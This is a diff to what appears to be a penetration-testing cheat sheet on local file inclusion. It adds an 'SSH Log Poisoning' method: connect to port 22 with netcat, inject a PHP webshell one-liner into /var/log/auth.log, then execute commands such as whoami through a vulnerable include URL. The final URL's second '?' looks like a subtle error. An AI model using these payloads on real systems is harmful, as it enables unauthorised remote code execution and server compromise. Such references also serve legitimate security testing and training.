@@ -18,6 +18,26 @@ Payload:
 
     http://example.com/vulnerable.php?page=/path/to/log/access.log&cmd=whoami
 
+## Alternate poisoning method: SSH Log Poisoning
+
+### 1) Locate the log file
+
+    /var/log/auth.log
+
+### 2) Poison the auth.log file
+
+Connect to SSH port via netcat
+
+    nc -nv IP 22
+
+Inject payload
+
+    <?php echo system($_GET['cmd']); ?>
+
+### 3) Run commands via your webshell now
+
+    http://domain.local/lfi.php?file=/var/log/auth.log?cmd=whoami
+
 ## Path Traversal manual payloads
 
 Simple traversal: start with 
